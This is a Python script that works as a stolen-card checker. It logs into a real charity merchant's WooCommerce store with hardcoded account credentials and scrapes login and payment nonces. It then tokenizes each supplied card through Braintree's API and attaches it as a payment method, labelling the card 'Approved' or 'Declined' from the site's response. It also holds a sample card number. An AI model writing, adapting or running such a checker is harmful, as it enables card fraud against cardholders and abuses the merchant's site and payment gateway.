
import base64
import random
import time
import re
import requests
import logging

logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

def gets(s, start, end):
    
    try:
        start_index = s.index(start) + len(start)
        end_index = s.index(end, start_index)
        return s[start_index:end_index]
    except ValueError:
        return None

def charge_resp(result):

    try:
        
        approved_messages = [
            "Payment method successfully added.",
            "Nice! New payment method added",
            "Invalid postal code or street address.", 
            "avs: Gateway Rejected: avs",
            "81724: Duplicate card exists in the vault." 
        ]
        
        
        if any(msg in result for msg in approved_messages):
            return "Approved ✅"
        else:
            
            return f"Declined ❌ - {result}"
    except Exception as e:
        return f"Error 🚫 - {str(e)}"

def process_card_b3(fullz):
 
    try:
        cc, mes, ano, cvv = fullz.split("|")

        
        username = "teamdiwas@gmail.com"
        password = "@khatrieex"

        
        if len(mes) < 2:
            mes = "0" + mes
        if len(str(ano)) < 4:
            ano = "20" + str(ano)

        ses = requests.Session()

        
        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36',
        }
        response = ses.get('https://iditarod.com/my-account/add-payment-method/', headers=headers)
        login_nonce = gets(response.text, 'name="woocommerce-login-nonce" value="', '"')
        if not login_nonce:
            return {"gateway": "Braintree Auth", "status": "Error", "response": "Login Nonce Not Found"}

        # --- Step 2: POST to log in ---
        headers.update({
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://iditarod.com',
            'referer': 'https://iditarod.com/my-account/add-payment-method/',
        })
        data = {
            'username': username,
            'password': password,
            'woocommerce-login-nonce': login_nonce,
            '_wp_http_referer': '/my-account/add-payment-method/',
            'login': 'Log in',
        }
        response = ses.post('https://iditarod.com/my-account/add-payment-method/', headers=headers, data=data)

        # --- Step 3: GET to fetch payment method nonce and client token nonce ---
        response = ses.get('https://iditarod.com/my-account/add-payment-method/', headers=headers)
        pnonce = gets(response.text, 'name="woocommerce-add-payment-method-nonce" value="', '"')
        client_token_nonce = gets(response.text, '"client_token_nonce":"', '"')
        if not pnonce or not client_token_nonce:
            return {"gateway": "Braintree Auth", "status": "Error", "response": "Payment Nonce or Client Token Nonce Not Found"}

        # --- Step 4: AJAX call to get the client token ---
        ajax_headers = {
            'accept': '*/*',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': 'https://iditarod.com',
            'referer': 'https://iditarod.com/my-account/add-payment-method/',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36',
            'x-requested-with': 'XMLHttpRequest',
        }
        data = {'action': 'wc_braintree_credit_card_get_client_token', 'nonce': client_token_nonce}
        response = ses.post('https://iditarod.com/wp-admin/admin-ajax.php', headers=ajax_headers, data=data)
        
        if 'data' not in response.json():
            return {"gateway": "Braintree Auth", "status": "Error", "response": "Client Token Data Not Found"}
        
        data_token = response.json()['data']
        decoded_token = base64.b64decode(data_token).decode('utf-8')
        auth_fingerprint = gets(decoded_token, 'authorizationFingerprint":"', '"')
        if not auth_fingerprint:
            return {"gateway": "Braintree Auth", "status": "Error", "response": "Authorization Fingerprint Not Found"}

        # --- Step 5: Tokenize the card with Braintree's GraphQL API ---
        graphql_headers = {
            'accept': '*/*',
            'authorization': f'Bearer {auth_fingerprint}',
            'braintree-version': '2018-05-10',
            'content-type': 'application/json',
            'origin': 'https://assets.braintreegateway.com',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36',
        }
        json_data = {
            'clientSdkMetadata': {'source': 'client', 'integration': 'custom', 'sessionId': 'd891c037-b1ca-4cf9-90bc-e31dca938ee4'},
            'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token creditCard { bin brandCode last4 } } }',
            'variables': {
                'input': {
                    'creditCard': {'number': cc, 'expirationMonth': mes, 'expirationYear': ano, 'cvv': cvv},
                    'options': {'validate': False},
                }
            },
            'operationName': 'TokenizeCreditCard',
        }
        response = ses.post('https://payments.braintree-api.com/graphql', headers=graphql_headers, json=json_data)
        
        if 'errors' in response.json():
             error_message = response.json()['errors'][0]['message']
             return {"gateway": "Braintree Auth", "status": "Declined", "response": f"Declined ❌ - {error_message}"}

        token = response.json()['data']['tokenizeCreditCard']['token']
        if not token:
            return {"gateway": "Braintree Auth", "status": "Error", "response": "Card Tokenization Failed"}

        # --- Step 6: Final POST to add the payment method to the site ---
        data = [
            ('payment_method', 'braintree_credit_card'),
            ('wc_braintree_credit_card_payment_nonce', token),
            ('wc-braintree-credit-card-tokenize-payment-method', 'true'),
            ('woocommerce-add-payment-method-nonce', pnonce),
            ('_wp_http_referer', '/my-account/add-payment-method/'),
            ('woocommerce_add_payment_method', '1'),
        ]
        response = ses.post('https://iditarod.com/my-account/add-payment-method/', headers=headers, data=data)

        # --- Step 7: Parse the final response ---
        if "Payment method successfully added" in response.text or "payment method added" in response.text.lower():
            result_text = "Payment method successfully added."
        else:
            resp = gets(response.text, '<ul class="woocommerce-error" role="alert">', '</ul>')
            if resp:
                pattern = r"Status code\s*(.*)</li>"
                match = re.search(pattern, resp)
                result_text = match.group(1).strip() if match else resp
            else:
                result_text = "Unknown error during final submission."

        response_text = charge_resp(result_text)
        status = "Approved" if "Approved" in response_text else "Declined"

        return {"gateway": "Braintree Auth", "status": status, "response": response_text}

    except Exception as e:
        logger.error(f"An unexpected error occurred: {str(e)}")
        return {"gateway": "Braintree Auth", "status": "Error", "response": f"Error 🚫 - {str(e)}"}


if __name__ == "__main__":
    
    test_card = "5334382120061518|11|27|782"
    
    print(f"Processing card: {test_card.split('|')[0]}")
    
    
    result = process_card_b3(test_card)
    
    
    print("\n--- Transaction Result ---")
    print(f"Gateway: {result.get('gateway')}")
    print(f"Status: {result.get('status')}")
    print(f"Response: {result.get('response')}")
    print("--------------------------\n")

